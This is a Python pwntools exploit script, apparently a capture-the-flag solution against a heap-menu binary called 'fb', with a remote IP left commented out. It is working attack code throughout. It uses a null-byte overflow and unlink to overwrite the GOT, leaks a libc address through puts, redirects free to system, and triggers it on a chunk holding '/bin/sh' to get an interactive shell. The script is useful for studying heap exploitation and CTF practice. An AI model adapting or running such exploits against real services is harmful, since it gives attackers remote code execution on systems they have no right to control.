# -*- coding: utf-8 -*-
from pwn import *

io=process('./fb')
# io = remote("114.55.103.213",9733)

SIZE=0xf8
PLT_puts=0x4006C0
GOT_free=0x602018
GOT_read=0x602040
FD=0x6020C8
BK=0x6020D0

def init(size):
    io.recvuntil('Choice:')
    io.sendline('1')
    io.recvuntil('length:')
    io.sendline(str(size))
    io.recvuntil('Done~')

def edit(index,content):
    io.recvuntil('Choice:')
    io.sendline('2')
    io.recvuntil('index:')
    io.sendline(str(index))
    io.recvuntil('content:')
    io.sendline(str(content))
    io.recvuntil('Done~')

def delete(index):
    io.recvuntil('Choice:')
    io.sendline('3')
    io.recvuntil('index:')
    io.sendline(str(index))
    io.recvuntil('Done~')

def leak(dst):
    edit(1,p64(dst)+p64(SIZE)[:-1])
    io.recvuntil('Choice:')
    io.sendline('3')
    io.recvuntil('index:')
    io.sendline('0')
    leakmem = io.recvuntil("Done~")[:-6]
    return str(leakmem)

def main():

    init(SIZE)
    init(SIZE)
    init(SIZE)
    init(SIZE)
    init(SIZE)

    payload=p64(0xf1)+p64(0xf1)+p64(FD)+p64(BK)+'A'*0xd0+p64(0xf0)
    # overflow null byte
    edit(2,payload)
        # gdb.attach(io,execute=("b *%s"%(0x400CCF)))
    delete(3)
        
    payload2=p64(SIZE)+p64(0x6020C0)+p64(SIZE)+p64(GOT_free)+p64(SIZE)
    edit(2,payload2)

    # modify GOT entry of free to PLT entry of puts
    # use [:1] to prevent \x00 from causing damage
    edit(2,p64(PLT_puts)[:-1])

    # leak read_addr
    read_addr=u64(leak(GOT_read).ljust(8,'\x00'))
    print "read_addr: "+str(hex(read_addr))


    system_addr=read_addr-0x980C0
    # system_addr= read_addr-0xeb6a0 +0x46590
    
    # modify free to system
    edit(2,p64(system_addr)[:-1])
    edit(4,"/bin/sh")
    
    # now get shell
    io.recvuntil('Choice:')
    io.sendline('3')
    io.recvuntil('index:')
    io.sendline('4')

    io.interactive()

main()